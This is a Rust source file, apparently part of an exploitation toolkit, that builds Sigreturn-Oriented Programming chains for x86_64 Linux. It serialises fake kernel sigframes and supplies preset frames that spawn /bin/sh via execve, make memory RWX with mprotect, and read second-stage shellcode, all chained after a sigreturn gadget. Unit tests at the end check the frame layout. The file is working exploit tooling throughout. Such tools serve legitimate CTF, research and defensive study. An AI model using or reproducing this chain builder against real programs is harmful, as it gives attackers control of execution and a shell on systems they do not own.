//! Sigreturn-Oriented Programming (SROP) chain builder.
//!
//! Constructs fake `sigcontext` frames for x86_64 Linux to exploit
//! `rt_sigreturn(2)` for arbitrary register/RIP control.

/// x86_64 sigframe (ucontext + sigcontext) for SROP.
///
/// When the kernel handles `rt_sigreturn`, it restores all registers
/// from this frame, giving full control over execution state.
///
/// Layout matches the kernel's `struct ucontext` on x86_64.
/// The `csgsfs` field packs `cs|gs|fs|ss` as 4 × u16 in one u64.
#[derive(Debug, Clone)]
pub struct SigFrame {
    // ucontext header (5 × 8 = 40 bytes)
    pub uc_flags: u64,
    pub uc_link: u64,
    pub ss_sp: u64,
    pub ss_flags: u64,
    pub ss_size: u64,
    // sigcontext registers (16 × 8 = 128 bytes)
    pub r8: u64,
    pub r9: u64,
    pub r10: u64,
    pub r11: u64,
    pub r12: u64,
    pub r13: u64,
    pub r14: u64,
    pub r15: u64,
    pub rdi: u64,
    pub rsi: u64,
    pub rbp: u64,
    pub rbx: u64,
    pub rdx: u64,
    pub rax: u64,
    pub rcx: u64,
    pub rsp: u64,
    // sigcontext control (2 × 8 = 16 bytes)
    pub rip: u64,
    pub eflags: u64,
    // segment registers packed: cs(u16)|gs(u16)|fs(u16)|ss(u16) (8 bytes)
    pub csgsfs: u64,
    // additional fields (7 × 8 = 56 bytes)
    pub err: u64,
    pub trapno: u64,
    pub oldmask: u64,
    pub cr2: u64,
    pub fpstate: u64,
    pub reserved: u64,
    pub sigmask: u64,
}

/// Size of the serialized sigframe in bytes.
pub const SIGFRAME_SIZE: usize = 248; // 31 fields × 8 bytes

/// x86_64 syscall number for `rt_sigreturn`.
pub const SYS_RT_SIGRETURN: u64 = 15;

/// Default csgsfs value for x86_64 Linux user-space:
/// cs=0x33, gs=0x00, fs=0x00, ss=0x2b.
pub const DEFAULT_CSGSFS: u64 = 0x002b_0000_0000_0033;

impl Default for SigFrame {
    fn default() -> Self {
        Self {
            uc_flags: 0,
            uc_link: 0,
            ss_sp: 0,
            ss_flags: 0,
            ss_size: 0,
            r8: 0, r9: 0, r10: 0, r11: 0,
            r12: 0, r13: 0, r14: 0, r15: 0,
            rdi: 0, rsi: 0, rbp: 0, rbx: 0,
            rdx: 0, rax: 0, rcx: 0, rsp: 0,
            rip: 0,
            eflags: 0,
            csgsfs: DEFAULT_CSGSFS,
            err: 0,
            trapno: 0,
            oldmask: 0,
            cr2: 0,
            fpstate: 0,
            reserved: 0,
            sigmask: 0,
        }
    }
}

impl SigFrame {
    /// Create a new sigframe with sensible defaults.
    pub fn new() -> Self {
        Self::default()
    }

    /// Set `rip` (where to jump after sigreturn).
    pub fn set_rip(mut self, rip: u64) -> Self { self.rip = rip; self }
    /// Set `rsp` (stack pointer after sigreturn).
    pub fn set_rsp(mut self, rsp: u64) -> Self { self.rsp = rsp; self }
    /// Set `rax` (syscall number for chained calls).
    pub fn set_rax(mut self, rax: u64) -> Self { self.rax = rax; self }
    /// Set `rdi` (first argument).
    pub fn set_rdi(mut self, rdi: u64) -> Self { self.rdi = rdi; self }
    /// Set `rsi` (second argument).
    pub fn set_rsi(mut self, rsi: u64) -> Self { self.rsi = rsi; self }
    /// Set `rdx` (third argument).
    pub fn set_rdx(mut self, rdx: u64) -> Self { self.rdx = rdx; self }
    /// Set `r10` (fourth syscall argument).
    pub fn set_r10(mut self, r10: u64) -> Self { self.r10 = r10; self }

    /// Serialize the sigframe to little-endian bytes.
    pub fn to_bytes(&self) -> Vec<u8> {
        let mut buf = Vec::with_capacity(SIGFRAME_SIZE);
        buf.extend_from_slice(&self.uc_flags.to_le_bytes());
        buf.extend_from_slice(&self.uc_link.to_le_bytes());
        buf.extend_from_slice(&self.ss_sp.to_le_bytes());
        buf.extend_from_slice(&self.ss_flags.to_le_bytes());
        buf.extend_from_slice(&self.ss_size.to_le_bytes());
        buf.extend_from_slice(&self.r8.to_le_bytes());
        buf.extend_from_slice(&self.r9.to_le_bytes());
        buf.extend_from_slice(&self.r10.to_le_bytes());
        buf.extend_from_slice(&self.r11.to_le_bytes());
        buf.extend_from_slice(&self.r12.to_le_bytes());
        buf.extend_from_slice(&self.r13.to_le_bytes());
        buf.extend_from_slice(&self.r14.to_le_bytes());
        buf.extend_from_slice(&self.r15.to_le_bytes());
        buf.extend_from_slice(&self.rdi.to_le_bytes());
        buf.extend_from_slice(&self.rsi.to_le_bytes());
        buf.extend_from_slice(&self.rbp.to_le_bytes());
        buf.extend_from_slice(&self.rbx.to_le_bytes());
        buf.extend_from_slice(&self.rdx.to_le_bytes());
        buf.extend_from_slice(&self.rax.to_le_bytes());
        buf.extend_from_slice(&self.rcx.to_le_bytes());
        buf.extend_from_slice(&self.rsp.to_le_bytes());
        buf.extend_from_slice(&self.rip.to_le_bytes());
        buf.extend_from_slice(&self.eflags.to_le_bytes());
        buf.extend_from_slice(&self.csgsfs.to_le_bytes());
        buf.extend_from_slice(&self.err.to_le_bytes());
        buf.extend_from_slice(&self.trapno.to_le_bytes());
        buf.extend_from_slice(&self.oldmask.to_le_bytes());
        buf.extend_from_slice(&self.cr2.to_le_bytes());
        buf.extend_from_slice(&self.fpstate.to_le_bytes());
        buf.extend_from_slice(&self.reserved.to_le_bytes());
        buf.extend_from_slice(&self.sigmask.to_le_bytes());
        buf
    }
}

/// Build a sigframe for `execve("/bin/sh", NULL, NULL)`.
///
/// `syscall_addr` is the address of a `syscall; ret` gadget.
/// `binsh_addr` is the address of a `"/bin/sh\0"` string in memory.
pub fn execve_frame(syscall_addr: u64, binsh_addr: u64) -> SigFrame {
    SigFrame::new()
        .set_rax(59) // __NR_execve
        .set_rdi(binsh_addr)
        .set_rsi(0)
        .set_rdx(0)
        .set_rip(syscall_addr)
}

/// Build a sigframe for `mprotect(addr, len, prot)`.
///
/// Useful for making a page RWX before jumping to shellcode.
pub fn mprotect_frame(syscall_addr: u64, addr: u64, len: u64, prot: u64) -> SigFrame {
    SigFrame::new()
        .set_rax(10) // __NR_mprotect
        .set_rdi(addr)
        .set_rsi(len)
        .set_rdx(prot)
        .set_rip(syscall_addr)
}

/// Build a sigframe for `read(fd, buf, count)`.
///
/// Useful for reading second-stage shellcode from stdin.
pub fn read_frame(syscall_addr: u64, fd: u64, buf: u64, count: u64) -> SigFrame {
    SigFrame::new()
        .set_rax(0) // __NR_read
        .set_rdi(fd)
        .set_rsi(buf)
        .set_rdx(count)
        .set_rip(syscall_addr)
}

/// Build a complete SROP chain: `[sigreturn_gadget, frame, ...]` pairs.
///
/// `sigreturn_addr` is a gadget that executes `mov rax, 15; syscall`
/// (or equivalent like `xor eax, eax; mov al, 15; syscall`).
pub fn build_chain(sigreturn_addr: u64, frames: &[SigFrame]) -> Vec<u8> {
    let mut chain = Vec::new();
    for frame in frames {
        chain.extend_from_slice(&sigreturn_addr.to_le_bytes());
        chain.extend_from_slice(&frame.to_bytes());
    }
    chain
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_segments() {
        let frame = SigFrame::new();
        assert_eq!(frame.csgsfs, DEFAULT_CSGSFS);
    }

    #[test]
    fn builder_pattern() {
        let frame = SigFrame::new()
            .set_rip(0x401000)
            .set_rsp(0x7fff0000)
            .set_rax(59)
            .set_rdi(0x402000);
        assert_eq!(frame.rip, 0x401000);
        assert_eq!(frame.rsp, 0x7fff0000);
        assert_eq!(frame.rax, 59);
        assert_eq!(frame.rdi, 0x402000);
    }

    #[test]
    fn serialization_size() {
        let bytes = SigFrame::new().to_bytes();
        assert_eq!(bytes.len(), SIGFRAME_SIZE);
    }

    #[test]
    fn serialization_rip() {
        let frame = SigFrame::new().set_rip(0xDEADBEEF);
        let bytes = frame.to_bytes();
        // rip is field 21 (0-indexed), byte offset = 21 × 8 = 168
        let rip_val = u64::from_le_bytes(bytes[168..176].try_into().unwrap());
        assert_eq!(rip_val, 0xDEADBEEF);
    }

    #[test]
    fn serialization_rax() {
        let frame = SigFrame::new().set_rax(59);
        let bytes = frame.to_bytes();
        // rax is field 18 (0-indexed), byte offset = 18 × 8 = 144
        let rax_val = u64::from_le_bytes(bytes[144..152].try_into().unwrap());
        assert_eq!(rax_val, 59);
    }

    #[test]
    fn execve_frame_correct() {
        let frame = execve_frame(0x401000, 0x402000);
        assert_eq!(frame.rax, 59);
        assert_eq!(frame.rdi, 0x402000);
        assert_eq!(frame.rsi, 0);
        assert_eq!(frame.rdx, 0);
        assert_eq!(frame.rip, 0x401000);
    }

    #[test]
    fn mprotect_frame_correct() {
        let frame = mprotect_frame(0x401000, 0x400000, 0x1000, 7);
        assert_eq!(frame.rax, 10);
        assert_eq!(frame.rdi, 0x400000);
        assert_eq!(frame.rsi, 0x1000);
        assert_eq!(frame.rdx, 7);
    }

    #[test]
    fn read_frame_correct() {
        let frame = read_frame(0x401000, 0, 0x7fff0000, 1024);
        assert_eq!(frame.rax, 0);
        assert_eq!(frame.rdi, 0);
        assert_eq!(frame.rsi, 0x7fff0000);
        assert_eq!(frame.rdx, 1024);
    }

    #[test]
    fn chain_single_frame() {
        let chain = build_chain(0x401234, &[execve_frame(0x401000, 0x402000)]);
        assert_eq!(chain.len(), 8 + SIGFRAME_SIZE);
        let addr = u64::from_le_bytes(chain[0..8].try_into().unwrap());
        assert_eq!(addr, 0x401234);
    }

    #[test]
    fn chain_multi_frame() {
        let frames = vec![
            mprotect_frame(0x401000, 0x600000, 0x1000, 7),
            read_frame(0x401000, 0, 0x600000, 0x100),
        ];
        let chain = build_chain(0x401234, &frames);
        assert_eq!(chain.len(), 2 * (8 + SIGFRAME_SIZE));
    }
}
